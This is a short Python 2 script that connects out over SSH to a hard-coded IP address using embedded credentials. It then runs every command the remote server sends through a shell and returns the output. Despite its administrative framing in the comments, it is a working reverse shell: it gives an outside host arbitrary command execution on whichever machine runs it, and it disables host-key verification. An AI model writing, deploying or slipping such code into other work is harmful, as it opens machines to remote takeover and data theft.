#this script supports running commands on a CLIENT over SSH (instead of running them on a server)
#that might be necessary for many windows-machines which don't include an SSH-server out-of-the-box.
#therefore one needs to reverse this and send commands from our SSH-server to the SSH-client

import threading
import paramiko
import subprocess

def ssh_command(ip, user, passwd, command):
  client = paramiko.SSHClient()
  #client.load_host_keys('/home/justin/.ssh/known_hosts')
  client.set_missing_host_key_policy(paramiko.AutoAddPolicy())
  client.connect(ip, username=user, password=passwd)
  ssh_session = client.get_transport().open_session()
  if ssh_session.active:
    ssh_session.send(command)
    print ssh_session.recv(1024) #read banner
    while True:
      command = ssh_session.recv(1024) #get the command from the ssh-server
      try:
	cmd_output = subprocess.check_output(command, shell=True)
	ssh_session.send(cmd_output)
      except Exception,e:
	ssh_session.send(str(e))
    client.close()
  return

ssh_command('140.181.13.0','pankrat','ololo','ClientConnected')